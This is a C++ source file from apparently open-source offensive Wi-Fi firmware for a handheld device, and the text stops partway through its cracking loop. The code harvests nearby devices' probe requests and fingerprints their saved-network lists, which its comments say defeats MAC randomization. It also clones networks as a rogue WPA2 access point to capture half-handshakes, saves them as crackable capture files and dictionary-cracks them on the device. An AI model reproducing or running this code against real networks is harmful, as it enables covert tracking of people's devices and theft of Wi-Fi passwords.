// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// karma / km — Phase 1: probe-request harvest + live network table.
//
// Clients constantly broadcast directed probe requests for the networks in their
// saved list (PNL). We sniff those in promiscuous mode (MGMT filter), parse the
// SA (probing STA) + requested SSID, and aggregate into two tables:
//   - per (MAC,SSID) records  → foundation for PNL fingerprinting (Phase 2)
//   - per SSID network rows    → live "who wants what" view shown here
//
// Fully headless: harvest lives in PSRAM only, no SD/GPS required (those are
// enrichment in later phases). See .claude/memory project_karma_plan.

#include "karma.h"
#include "display_manager.h"
#include "utils.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "oui_lookup.h"
#include "sdcard_manager.h"
#include "dot11.h"            // shared 802.11 parse (SSID IE, EAPOL)
#include "pcap_writer.h"      // shared libpcap writer
#include "captive_portal.h"  // shared open/WPA2 portal + cred capture
#include "wpa_crack.h"        // shared PBKDF2 / handshake-MIC dictionary crack
#include "rogue_handshake.h"  // manual rogue-AP WPA2 half-handshake engine
#include "wifi_sd_guard.h"    // ScopedPromiscPause — GDMA-safe mid-promiscuous SD writes
#include "clock_manager.h"    // timestamps for the auto-mode connects.csv log
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>
#include <SD.h>
#include <string.h>
#include <strings.h>   // strcasecmp

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern SDCardManager  sdCardManager;

// ── capacities ────────────────────────────────────────────────────────────────
#define KM_RING       48     // ISR→main lock-free ring (internal DRAM)
#define KM_PROBE_MAX 256     // unique (MAC,SSID) records (PSRAM)
#define KM_NET_MAX   128     // unique SSID rows (PSRAM)
#define KM_RPP         7     // network table rows per page
#define KM_MAC_MAX   128     // distinct probing MACs (fingerprint pass)
#define KM_PNL_MAX    16     // SSIDs tracked per MAC / per device
#define KM_DEV_MAX    64     // clustered physical devices
#define KM_DEV_RPP     5     // device table rows per page
#define KM_DISTINCT    4     // SSID is "distinctive" if wanted by <= this many MACs

enum KmView { VIEW_NETS = 0, VIEW_DEVS = 1 };

// ── ISR ring entry (DRAM — never PSRAM, written from the promiscuous cb) ───────
struct KmRing { uint8_t mac[6]; char ssid[33]; int8_t rssi; uint8_t ch; };
static volatile KmRing s_ring[KM_RING];
static volatile uint8_t s_head = 0, s_tail = 0;

// ── aggregated tables (PSRAM, drained/owned by main loop) ──────────────────────
struct KmProbeRec { uint8_t mac[6]; char ssid[33]; uint16_t hits; int8_t rssi;
                    uint32_t firstMs, lastMs; uint8_t ch; };
struct KmNet      { char ssid[33]; uint16_t devs; uint32_t hits; int8_t rssi; uint8_t ch;
                    bool captured; uint32_t lastBaitMs; };   // auto-mode bookkeeping

static KmProbeRec* s_recs = nullptr;
static KmNet*      s_nets = nullptr;
static int         s_recCount = 0, s_netCount = 0;
static uint32_t    s_totalProbes = 0;

// ── fingerprint tables (PSRAM, rebuilt from s_recs on demand) ──────────────────
// PNL = a device's Preferred Network List. pnl[] holds indices into s_nets.
struct KmMac    { uint8_t mac[6]; uint16_t pnl[KM_PNL_MAX]; uint8_t pnlCount;
                  int8_t rssi; uint32_t lastMs; };
struct KmDevice { uint8_t rep[6]; uint8_t macCount; uint16_t pnl[KM_PNL_MAX]; uint8_t pnlCount;
                  const char* vendor; const char* type; bool randomized; bool hasReal;
                  int8_t rssi; uint32_t lastMs; };

static KmMac*    s_macs = nullptr;
static KmDevice* s_devs = nullptr;
static int       s_macCount = 0, s_devCount = 0;

// transient "Saved NNN.csv" confirmation shown in the harvest footer
static uint32_t  s_saveNoticeMs = 0;
static char      s_saveNotice[28] = {0};

// ── promiscuous probe-request callback ─────────────────────────────────────────
static void IRAM_ATTR karmaRxCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (t != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    uint16_t len = p->rx_ctrl.sig_len;
    if (len < 24) return;
    const uint8_t* d = p->payload;

    if (dot11::fType(d) != 0 || dot11::fSubtype(d) != dot11::ST_PROBE_REQ) return;
    if (d[10] & 0x01) return;            // multicast/broadcast SA → skip

    char ssid[33];
    if (dot11::extractSSID(d, len, dot11::ST_PROBE_REQ, ssid, sizeof(ssid)) == 0) return; // wildcard

    uint8_t next = (s_head + 1) % KM_RING;
    if (next == s_tail) return;          // ring full — drop
    KmRing& e = (KmRing&)s_ring[s_head];
    memcpy(e.mac, d + 10, 6);
    strncpy(e.ssid, ssid, sizeof(e.ssid) - 1); e.ssid[sizeof(e.ssid) - 1] = '\0';
    e.rssi = p->rx_ctrl.rssi;
    e.ch   = p->rx_ctrl.channel;
    s_head = next;
}

// ── ingest one harvested probe into the aggregated tables ──────────────────────
static void ingest(const KmRing& e) {
    uint32_t now = millis();
    s_totalProbes++;

    // per (MAC,SSID) record
    int rec = -1;
    for (int i = 0; i < s_recCount; i++)
        if (memcmp(s_recs[i].mac, e.mac, 6) == 0 && strcmp(s_recs[i].ssid, e.ssid) == 0) { rec = i; break; }
    bool added = false;
    if (rec < 0 && s_recCount < KM_PROBE_MAX) {
        rec = s_recCount++;
        KmProbeRec& r = s_recs[rec];
        memcpy(r.mac, e.mac, 6);
        strncpy(r.ssid, e.ssid, 32); r.ssid[32] = '\0';
        r.hits = 0; r.firstMs = now; r.ch = e.ch;
        added = true;
    }
    if (rec >= 0) {
        KmProbeRec& r = s_recs[rec];
        r.hits++; r.rssi = e.rssi; r.lastMs = now; r.ch = e.ch;
    }

    // per SSID network row
    int net = -1;
    for (int i = 0; i < s_netCount; i++)
        if (strcmp(s_nets[i].ssid, e.ssid) == 0) { net = i; break; }
    if (net < 0 && s_netCount < KM_NET_MAX) {
        net = s_netCount++;
        KmNet& n = s_nets[net];
        strncpy(n.ssid, e.ssid, 32); n.ssid[32] = '\0';
        n.devs = 0; n.hits = 0; n.captured = false; n.lastBaitMs = 0;
    }
    if (net >= 0) {
        KmNet& n = s_nets[net];
        n.hits++; n.rssi = e.rssi; n.ch = e.ch;
        if (added) n.devs++;             // a new device now wants this SSID
    }
}

static void drainRing() {
    while (s_tail != s_head) {
        KmRing e;
        memcpy(&e, (const void*)&s_ring[s_tail], sizeof(KmRing));
        s_tail = (s_tail + 1) % KM_RING;
        ingest(e);
    }
}

// ── PNL fingerprinting — cluster MACs into physical devices ────────────────────
// Defeats MAC randomization for devices that leak a multi-SSID PNL from one MAC
// (randomization off, or per-session). Per-network randomization (one stable
// private MAC per saved SSID) can't be PNL-linked → those stay single-MAC devices.
static inline bool laMac(const uint8_t* m) { return (m[0] & 0x02) != 0; }

static int findp(int* parent, int i) {
    while (parent[i] != i) { parent[i] = parent[parent[i]]; i = parent[i]; }
    return i;
}
static void unite(int* parent, int a, int b) {
    int ra = findp(parent, a), rb = findp(parent, b);
    if (ra != rb) parent[ra] = rb;
}

// Two MACs are the same device if they share >=2 distinctive SSIDs, or one's PNL
// is fully contained in the other's and they share >=1 distinctive SSID.
static bool sameDevice(const KmMac& a, const KmMac& b) {
    int shared = 0, sharedDistinct = 0;
    for (int i = 0; i < a.pnlCount; i++)
        for (int j = 0; j < b.pnlCount; j++)
            if (a.pnl[i] == b.pnl[j]) {
                shared++;
                if (s_nets[a.pnl[i]].devs <= KM_DISTINCT) sharedDistinct++;
                break;
            }
    if (sharedDistinct >= 2) return true;
    int smaller = a.pnlCount < b.pnlCount ? a.pnlCount : b.pnlCount;
    return (smaller > 0 && shared == smaller && sharedDistinct >= 1);
}

static void rebuildDevices() {
    // 1. per-MAC PNL from the (MAC,SSID) records
    s_macCount = 0;
    for (int i = 0; i < s_recCount; i++) {
        const KmProbeRec& r = s_recs[i];
        int ni = -1;
        for (int j = 0; j < s_netCount; j++) if (strcmp(s_nets[j].ssid, r.ssid) == 0) { ni = j; break; }
        if (ni < 0) continue;
        int mi = -1;
        for (int j = 0; j < s_macCount; j++) if (memcmp(s_macs[j].mac, r.mac, 6) == 0) { mi = j; break; }
        if (mi < 0) {
            if (s_macCount >= KM_MAC_MAX) continue;
            mi = s_macCount++;
            memcpy(s_macs[mi].mac, r.mac, 6);
            s_macs[mi].pnlCount = 0; s_macs[mi].rssi = r.rssi; s_macs[mi].lastMs = r.lastMs;
        }
        KmMac& m = s_macs[mi];
        bool have = false;
        for (int k = 0; k < m.pnlCount; k++) if (m.pnl[k] == ni) { have = true; break; }
        if (!have && m.pnlCount < KM_PNL_MAX) m.pnl[m.pnlCount++] = (uint16_t)ni;
        if (r.lastMs >= m.lastMs) { m.lastMs = r.lastMs; m.rssi = r.rssi; }
    }

    // 2. union-find over MACs
    static int parent[KM_MAC_MAX];
    for (int i = 0; i < s_macCount; i++) parent[i] = i;
    for (int i = 0; i < s_macCount; i++)
        for (int j = i + 1; j < s_macCount; j++)
            if (sameDevice(s_macs[i], s_macs[j])) unite(parent, i, j);

    // 3. collapse clusters into devices
    static int devOf[KM_MAC_MAX];
    for (int i = 0; i < s_macCount; i++) devOf[i] = -1;
    s_devCount = 0;
    for (int i = 0; i < s_macCount; i++) {
        int root = findp(parent, i);
        int di = devOf[root];
        if (di < 0) {
            if (s_devCount >= KM_DEV_MAX) continue;
            di = s_devCount++;
            devOf[root] = di;
            KmDevice& d = s_devs[di];
            d.macCount = 0; d.pnlCount = 0; d.randomized = false; d.hasReal = false;
            d.vendor = nullptr; d.type = nullptr; d.rssi = -127; d.lastMs = 0;
        }
        KmDevice& d = s_devs[di];
        KmMac&    m = s_macs[i];
        if (d.macCount == 0) memcpy(d.rep, m.mac, 6);   // default rep
        d.macCount++;
        for (int k = 0; k < m.pnlCount; k++) {
            bool have = false;
            for (int x = 0; x < d.pnlCount; x++) if (d.pnl[x] == m.pnl[k]) { have = true; break; }
            if (!have && d.pnlCount < KM_PNL_MAX) d.pnl[d.pnlCount++] = m.pnl[k];
        }
        if (laMac(m.mac)) d.randomized = true;
        else if (!d.hasReal) {                          // prefer a real MAC for vendor + rep
            d.hasReal = true;
            memcpy(d.rep, m.mac, 6);
            OuiInfo oi = ouiLookup(m.mac);
            d.vendor = oi.vendor; d.type = oi.type;
        }
        if (m.lastMs >= d.lastMs) d.lastMs = m.lastMs;
        if (m.rssi > d.rssi)      d.rssi  = m.rssi;
    }

    // 4. vendor fallback for all-random devices (→ "LA-MAC"/"RandMAC")
    for (int i = 0; i < s_devCount; i++)
        if (!s_devs[i].vendor) {
            OuiInfo oi = ouiLookup(s_devs[i].rep);
            s_devs[i].vendor = oi.vendor; s_devs[i].type = oi.type;
        }
}

// ── PSRAM buffers ──────────────────────────────────────────────────────────────
static bool ensureBuffers() {
    if (!s_recs) s_recs = (KmProbeRec*)ps_malloc((size_t)KM_PROBE_MAX * sizeof(KmProbeRec));
    if (!s_nets) s_nets = (KmNet*)ps_malloc((size_t)KM_NET_MAX * sizeof(KmNet));
    if (!s_macs) s_macs = (KmMac*)ps_malloc((size_t)KM_MAC_MAX * sizeof(KmMac));
    if (!s_devs) s_devs = (KmDevice*)ps_malloc((size_t)KM_DEV_MAX * sizeof(KmDevice));
    if (!s_recs || !s_nets || !s_macs || !s_devs) return false;
    s_recCount = s_netCount = s_macCount = s_devCount = 0;
    s_totalProbes = 0;
    s_head = s_tail = 0;
    return true;
}
static void freeBuffers() {
    if (s_recs) { free(s_recs); s_recs = nullptr; }
    if (s_nets) { free(s_nets); s_nets = nullptr; }
    if (s_macs) { free(s_macs); s_macs = nullptr; }
    if (s_devs) { free(s_devs); s_devs = nullptr; }
    s_recCount = s_netCount = s_macCount = s_devCount = 0;
}

// ── harvest promiscuous start/stop (paused around interactive handshake) ───────
static void harvestStart() {
    WiFi.disconnect(false);
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(karmaRxCb);
}
static void harvestStop() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}

// ── display ─────────────────────────────────────────────────────────────────────
static void drawHeader(const char* noun, int page, int totalPages) {
    DisplayManager& dm = displayManager;
    dm.clearScreen();
    dm.setDefaultTextSize();
    dm.setCursor(4, outputY);
    dm.setTextColor(0x7BEF);    dm.printText("[");
    dm.setTextColor(TFT_CYAN);  dm.printText("KRMA");
    dm.setTextColor(0x7BEF);    dm.printText("::");
    dm.setTextColor(TFT_YELLOW);dm.printText(noun);
    dm.setTextColor(0x7BEF);    dm.printText("]  ");
    char pg[8]; snprintf(pg, sizeof(pg), "%02d/%02d", totalPages ? page + 1 : 0, totalPages);
    dm.setTextColor(0x7BEF);    dm.println(pg);
    dm.printSeparator();
}

// Sort network rows by device-count desc (popularity), then hits.
static void buildOrder(int* idx, int n) {
    for (int i = 0; i < n; i++) idx[i] = i;
    for (int i = 1; i < n; i++) {           // insertion sort (n <= KM_NET_MAX)
        int key = idx[i], j = i - 1;
        while (j >= 0) {
            const KmNet& a = s_nets[idx[j]];
            const KmNet& b = s_nets[key];
            bool less = (a.devs < b.devs) || (a.devs == b.devs && a.hits < b.hits);
            if (!less) break;
            idx[j + 1] = idx[j]; j--;
        }
        idx[j + 1] = key;
    }
}

static void drawNets(uint8_t ch, int page, int sel) {
    DisplayManager& dm = displayManager;
    if (dm.isBlocked()) return;

    int n = s_netCount;
    int totalPages = n ? (n + KM_RPP - 1) / KM_RPP : 1;
    if (page >= totalPages) page = totalPages - 1;

    drawHeader("HARV", page, n ? totalPages : 0);

    // stats line
    dm.setCursor(4, dm.getCursorY());
    char stat[64];
    snprintf(stat, sizeof(stat), "Ch:%-2u  SSIDs:%-3d  Probes:%lu",
             ch, n, (unsigned long)s_totalProbes);
    dm.setTextColor(TFT_GREEN); dm.println(stat);

    // column header
    dm.setCursor(8, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.printText("SSID");
    dm.setCursor(196, dm.getCursorY()); dm.printText("DEV");
    dm.setCursor(232, dm.getCursorY()); dm.printText("HIT");
    dm.setCursor(280, dm.getCursorY()); dm.printText("RSSI");
    dm.println("");
    dm.printSeparator();

    int32_t baseY = dm.getCursorY() + 1;   // fixed-grid rows so highlight aligns
    if (n == 0) {
        dm.setCursor(4, baseY + 4);
        dm.setTextColor(0x7BEF);
        dm.println("Listening for probe requests...");
    } else {
        int order[KM_NET_MAX];
        buildOrder(order, n);
        if (sel >= n) sel = n - 1;
        int start = page * KM_RPP;
        int end   = start + KM_RPP < n ? start + KM_RPP : n;
        for (int i = start; i < end; i++) {
            const KmNet& net = s_nets[order[i]];
            int32_t ry = baseY + (i - start) * LINE_HEIGHT;
            if (i == sel) {
                dm.fillRect(0, ry - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);
                dm.setCursor(0, ry); dm.setTextColor(TFT_YELLOW); dm.printText(">");
            }
            dm.setCursor(8, ry);
            dm.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE);
            char nm[24]; snprintf(nm, sizeof(nm), "%.21s", net.ssid);
            dm.printText(nm);
            char b[12];
            dm.setCursor(196, ry); dm.setTextColor(TFT_CYAN);
            snprintf(b, sizeof(b), "%u", net.devs); dm.printText(b);
            dm.setCursor(232, ry); dm.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE);
            snprintf(b, sizeof(b), "%lu", (unsigned long)net.hits); dm.printText(b);
            dm.setCursor(280, ry); dm.setTextColor(0x7BEF);
            snprintf(b, sizeof(b), "%d", net.rssi); dm.printText(b);
        }
    }

    dm.setCursor(0, baseY + KM_RPP * LINE_HEIGHT + 2);
    dm.printSeparator();
    dm.setCursor(4, dm.getCursorY());
    if (millis() - s_saveNoticeMs < 2500) {
        dm.setTextColor(TFT_GREEN); dm.println(s_saveNotice);
    } else {
        dm.setTextColor(0x7BEF); dm.println("[h]hs [p]portal [s]save [v]devs [q]stop");
    }
}

// Sort devices by PNL size desc (richest fingerprint first), then RSSI.
static void buildDevOrder(int* idx, int n) {
    for (int i = 0; i < n; i++) idx[i] = i;
    for (int i = 1; i < n; i++) {
        int key = idx[i], j = i - 1;
        while (j >= 0) {
            const KmDevice& a = s_devs[idx[j]];
            const KmDevice& b = s_devs[key];
            bool less = (a.pnlCount < b.pnlCount) || (a.pnlCount == b.pnlCount && a.rssi < b.rssi);
            if (!less) break;
            idx[j + 1] = idx[j]; j--;
        }
        idx[j + 1] = key;
    }
}

static void drawDevices(int page, int sel) {
    DisplayManager& dm = displayManager;
    if (dm.isBlocked()) return;

    int n = s_devCount;
    int totalPages = n ? (n + KM_DEV_RPP - 1) / KM_DEV_RPP : 1;
    if (page >= totalPages) page = totalPages - 1;

    drawHeader("DEVS", page, n ? totalPages : 0);

    dm.setCursor(4, dm.getCursorY());
    char stat[64];
    snprintf(stat, sizeof(stat), "Devs:%-3d  MACs:%-3d", n, s_macCount);
    dm.setTextColor(TFT_GREEN); dm.println(stat);

    // column header
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.printText("VENDOR/TYPE");
    dm.setCursor(200, dm.getCursorY()); dm.printText("PNL");
    dm.setCursor(232, dm.getCursorY()); dm.printText("MAC");
    dm.setCursor(280, dm.getCursorY()); dm.printText("RSSI");
    dm.println("");
    dm.printSeparator();

    // Fixed-grid rows: highlight bar pitch == LINE_HEIGHT (println advance is
    // shorter than 14px and would let the bar bleed into the next row).
    int order[KM_DEV_MAX];
    int32_t baseY = dm.getCursorY() + 1;
    if (n == 0) {
        dm.setCursor(4, baseY + 4);
        dm.setTextColor(0x7BEF);
        dm.println("No devices fingerprinted yet.");
    } else {
        buildDevOrder(order, n);
        if (sel >= n) sel = n - 1;
        int start = page * KM_DEV_RPP;
        int end   = start + KM_DEV_RPP < n ? start + KM_DEV_RPP : n;
        for (int i = start; i < end; i++) {
            const KmDevice& d = s_devs[order[i]];
            int32_t ry = baseY + (i - start) * LINE_HEIGHT;
            if (i == sel) {
                dm.fillRect(0, ry - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);  // dark slate-blue (bmon style)
                dm.setCursor(0, ry); dm.setTextColor(TFT_YELLOW); dm.printText(">");
            }
            dm.setCursor(8, ry);
            dm.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE);
            char vt[28];
            snprintf(vt, sizeof(vt), "%.10s/%.6s",
                     d.vendor ? d.vendor : "?", d.type ? d.type : "?");
            dm.printText(vt);
            char b[12];
            dm.setCursor(200, ry); dm.setTextColor(TFT_CYAN);
            snprintf(b, sizeof(b), "%u", d.pnlCount); dm.printText(b);
            dm.setCursor(232, ry);
            dm.setTextColor(d.macCount > 1 ? TFT_GREEN : 0x7BEF);   // green = MACs collapsed
            snprintf(b, sizeof(b), "%u", d.macCount); dm.printText(b);
            dm.setCursor(280, ry); dm.setTextColor(0x7BEF);
            snprintf(b, sizeof(b), "%d", d.rssi); dm.printText(b);
        }
    }

    // detail pane — selected device's PNL (2 lines), at a fixed Y below the grid
    int32_t paneY = baseY + KM_DEV_RPP * LINE_HEIGHT + 2;
    dm.setCursor(0, paneY);
    dm.printSeparator();
    if (n > 0) {
        buildDevOrder(order, n);
        if (sel >= n) sel = n - 1;
        const KmDevice& d = s_devs[order[sel]];
        char pnl[120]; pnl[0] = '\0';
        for (int k = 0; k < d.pnlCount; k++) {
            const char* nm = (d.pnl[k] < (uint16_t)s_netCount) ? s_nets[d.pnl[k]].ssid : "?";
            size_t cur = strlen(pnl);
            if (cur && cur < sizeof(pnl) - 2) { pnl[cur++] = ','; pnl[cur++] = ' '; pnl[cur] = '\0'; }
            strncat(pnl, nm, sizeof(pnl) - strlen(pnl) - 1);
            if (strlen(pnl) >= sizeof(pnl) - 4) break;
        }
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF); dm.printText("PNL: ");
        dm.setTextColor(TFT_WHITE);
        char l1[44]; snprintf(l1, sizeof(l1), "%.38s", pnl);
        dm.println(l1);
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(TFT_WHITE);
        char l2[52]; snprintf(l2, sizeof(l2), "%.50s", strlen(pnl) > 38 ? pnl + 38 : "");
        dm.println(l2);
    }

    dm.printSeparator();
    dm.setCursor(4, dm.getCursorY());
    if (millis() - s_saveNoticeMs < 2500) {
        dm.setTextColor(TFT_GREEN); dm.println(s_saveNotice);
    } else {
        dm.setTextColor(0x7BEF); dm.println("[h]hs [p]portal [s]save [v]nets [q]stop");
    }
}

// ════════════════════════════════════════════════════════════════════════════════
// Phase 3 — WPA2 rogue-AP half-handshake (manual EAPOL responder)
// We are the AP, so we GENERATE the ANonce and inject our own M1 — no need to
// capture M1 over the air (ESP32 can't hear its own TX). A client that has the
// real network saved associates to our cloned WPA2 SSID and replies M2, whose MIC
// is keyed by the REAL password (half handshake). With our known ANonce + the
// sniffed M2 it cracks offline. All the AP-side frames are injected by the
// roguehs engine (rogue_handshake.cpp). See .claude/memory project_karma_rogue_handshake.
// ════════════════════════════════════════════════════════════════════════════════

// Make an SSID safe to use as a filename.
static void sanitizeSsid(const char* ssid, char* out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; ssid[i] && j < n - 1; i++) {
        char c = ssid[i];
        bool ok = (c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='-'||c=='_'||c=='.';
        out[j++] = ok ? c : '_';
    }
    out[j] = '\0';
    if (j == 0) strncpy(out, "ssid", n);
}

// Write an aircrack/hashcat-ready .cap of the rogue half-handshake: beacon (carries
// the ESSID/BSSID) + the M1 we injected (our ANonce) + the client's sniffed M2. The
// M1 replay counter (1) matches the counter the client echoes in M2, so the tools
// pair them into a crackable hash. NEVER overwrites: writes /apps/karma/<ssid>.cap, or
// <ssid>-1.cap, <ssid>-2.cap, … if that name already exists. Fills `capName` with the
// basename actually written (e.g. "MyNet-2.cap"). Call AFTER engine teardown (GDMA-safe).
static bool karmaSaveCap(const char* ssid, const roguehs::State& s, char* capName, size_t capN) {
    if (capName && capN) capName[0] = '\0';
    if (!sdCardManager.canAccessSD() || !s.gotM2 || !s.m2RawLen) return false;
    sdCardManager.ensureDir(SD_DIR_KARMA);
    char safe[40]; sanitizeSsid(ssid, safe, sizeof(safe));
    char base[48], fname[96];
    snprintf(base, sizeof(base), "%s.cap", safe);
    snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s", base);
    for (int i = 1; SD.exists(fname) && i < 1000; i++) {       // find a free name
        snprintf(base, sizeof(base), "%s-%d.cap", safe, i);
        snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s", base);
    }
    File cap = SD.open(fname, FILE_WRITE);
    if (!cap) return false;
    pcap::writeGlobalHeader(cap);
    uint32_t t = s.capTs ? s.capTs : millis();
    if (s.beaconLen) pcap::writeRecord(cap, s.beacon, s.beaconLen, t > 20 ? t - 20 : 0);
    if (s.m1RawLen)  pcap::writeRecord(cap, s.m1Raw,  s.m1RawLen,  t > 10 ? t - 10 : 0);
    pcap::writeRecord(cap, s.m2Raw, s.m2RawLen, t);
    cap.flush(); cap.close();
    if (capName && capN) { strncpy(capName, base, capN - 1); capName[capN - 1] = '\0'; }
    return true;
}

// Copy `in` into `out`, neutralising CSV-breaking chars (comma/newline → space).
static const char* csvSafe(const char* in, char* out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j < n - 1; i++) {
        char c = in[i];
        out[j++] = (c == ',' || c == '\n' || c == '\r') ? ' ' : c;
    }
    out[j] = '\0';
    return out;
}

// Next free sequential number for /apps/karma/NNN.csv (never overwrites; same
// scheme as wguard/bmon). Scans the dir for files named exactly "NNN.csv".
static int nextKarmaSeq() {
    int maxN = 0;
    File dir = SD.open(SD_DIR_KARMA);
    if (dir && dir.isDirectory()) {
        for (File f = dir.openNextFile(); f; f = dir.openNextFile()) {
            const char* nm = f.name();
            const char* b = strrchr(nm, '/'); b = b ? b + 1 : nm;
            if (strlen(b) == 7 && b[0] >= '0' && b[0] <= '9' && b[1] >= '0' && b[1] <= '9' &&
                b[2] >= '0' && b[2] <= '9' && strcasecmp(b + 3, ".csv") == 0) {
                int v = (b[0] - '0') * 100 + (b[1] - '0') * 10 + (b[2] - '0');
                if (v > maxN) maxN = v;
            }
            f.close();
        }
    }
    if (dir) dir.close();
    return maxN + 1;
}

// Save the current harvest (SSID table) + fingerprinted devices to a sequential
// /apps/karma/NNN.csv (one file, [NETS] + [DEVICES] sections). GDMA-safe: pauses
// promiscuous around all SD I/O. Returns the sequence number, or -1 on failure.
static int karmaSaveTables() {
    if (!sdCardManager.canAccessSD()) return -1;
    rebuildDevices();                          // refresh DEVICES even if HARV view is up
    ScopedPromiscPause _pause;                 // GDMA: pause promiscuous around SD I/O
    sdCardManager.ensureDir(SD_DIR_KARMA);
    int seq = nextKarmaSeq();
    char fname[48]; snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%03d.csv", seq);
    File f = SD.open(fname, FILE_WRITE);
    if (!f) return -1;

    char buf[40];
    f.printf("# KARMA harvest %03d  probes=%lu ssids=%d devices=%d\n",
             seq, (unsigned long)s_totalProbes, s_netCount, s_devCount);

    f.println("[NETS]");
    f.println("ssid,devices,hits,rssi,channel");
    int no[KM_NET_MAX]; buildOrder(no, s_netCount);
    for (int i = 0; i < s_netCount; i++) {
        const KmNet& n = s_nets[no[i]];
        f.printf("%s,%u,%lu,%d,%u\n", csvSafe(n.ssid, buf, sizeof(buf)),
                 n.devs, (unsigned long)n.hits, n.rssi, n.ch);
    }

    f.println("[DEVICES]");
    f.println("id,vendor,type,macs,randomized,pnl_count,rssi,pnl");
    int dvo[KM_DEV_MAX]; buildDevOrder(dvo, s_devCount);
    for (int i = 0; i < s_devCount; i++) {
        const KmDevice& d = s_devs[dvo[i]];
        f.printf("%d,%s,%s,%u,%d,%u,%d,", i, d.vendor ? d.vendor : "?",
                 d.type ? d.type : "?", d.macCount, d.randomized ? 1 : 0, d.pnlCount, d.rssi);
        for (int k = 0; k < d.pnlCount; k++) {                  // PNL joined by ';'
            const char* nm = (d.pnl[k] < (uint16_t)s_netCount) ? s_nets[d.pnl[k]].ssid : "?";
            f.print(csvSafe(nm, buf, sizeof(buf)));
            if (k + 1 < d.pnlCount) f.print(';');
        }
        f.print('\n');
    }
    f.flush(); f.close();
    return seq;
}

// On-device dictionary crack of the rogue half-handshake. We pass in the known
// ANonce (we chose it as the AP) plus the sniffed M2 material, then run the shared
// cracker over the SD wordlist (/apps/karma/wordlist.txt) and the built-in list.
// Call AFTER the engine teardown (SD safe).
static void karmaCrack(const char* ssid, const uint8_t apMac[6], const uint8_t staMac[6],
                       const uint8_t aNonce[32], const uint8_t sNonce[32],
                       const uint8_t* eapol, uint16_t eapolLen, const uint8_t mic[16],
                       const char* capName) {
    DisplayManager& dm = displayManager;

    auto drawCrackHeader = [&]() {
        dm.clearScreen();
        dm.setCursor(4, outputY);
        dm.setTextColor(0x7BEF); dm.printText("[");
        dm.setTextColor(TFT_CYAN); dm.printText("KRMA");
        dm.setTextColor(0x7BEF); dm.printText("::");
        dm.setTextColor(TFT_YELLOW); dm.printText("CRACK");
        dm.setTextColor(0x7BEF); dm.println("]");
        dm.printSeparator();
    };
    drawCrackHeader();

    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_context_t ctx; mbedtls_md_init(&ctx); mbedtls_md_setup(&ctx, sha1, 1);

    // ── Wordlist source picker (mirrors ws): only prompt if an SD list exists ──
    bool hasWl = sdCardManager.canAccessSD() && SD.exists(SD_DIR_KARMA "/wordlist.txt");
    bool useSD = hasWl;
    if (hasWl) {
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(TFT_GREEN);  dm.println("[1] /apps/karma/wordlist.txt (SD)");
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF);     dm.println("[2] Built-in (100 pwds)");
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(TFT_WHITE);  dm.println("Choose source:");
        char c = 0;
        while (c != '1' && c != '2') { c = inputHandler.getKeyboardInput(); vTaskDelay(1); }
        useSD = (c == '1');
        drawCrackHeader();   // wipe the picker so crack status starts clean
    }
    // Static area (header + source line) — redrawn after a lock-screen blanks it.
    int32_t statY = 0;
    auto drawStatic = [&]() {
        drawCrackHeader();
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
        dm.println(useSD ? "Source: SD wordlist" : "Source: built-in (100)");
        statY = dm.getCursorY();
    };
    drawStatic();

    char found[64] = {0};
    uint32_t tried = 0, lastRedraw = 0;
    bool done = false, aborted = false;

    auto status = [&](const char* cand) {
        dm.fillRect(4, statY, SCREEN_WIDTH - 8, LINE_HEIGHT * 2, TFT_BLACK);
        dm.setCursor(4, statY); dm.setTextColor(TFT_WHITE);
        char b[40]; snprintf(b, sizeof(b), "Tried: %lu", (unsigned long)tried); dm.println(b);
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x4208);
        char c[40]; snprintf(c, sizeof(c), "%.30s", cand); dm.println(c);
    };

    // SD wordlist first
    if (useSD) {
        File wl = SD.open(SD_DIR_KARMA "/wordlist.txt", FILE_READ);
        while (wl && wl.available() && !done) {
            String line = wl.readStringUntil('\n'); line.trim();
            if (line.length() < 8) continue;
            tried++;
            uint32_t now = millis();
            if (LockScreenManager::getInstance().consumeJustUnlocked()) {
                drawStatic(); status(line.c_str()); lastRedraw = now;
            }
            if (now - lastRedraw >= 300) {
                lastRedraw = now; status(line.c_str());
                if (inputHandler.getKeyboardInput() == 'q') { aborted = true; break; }
                vTaskDelay(1);
            }
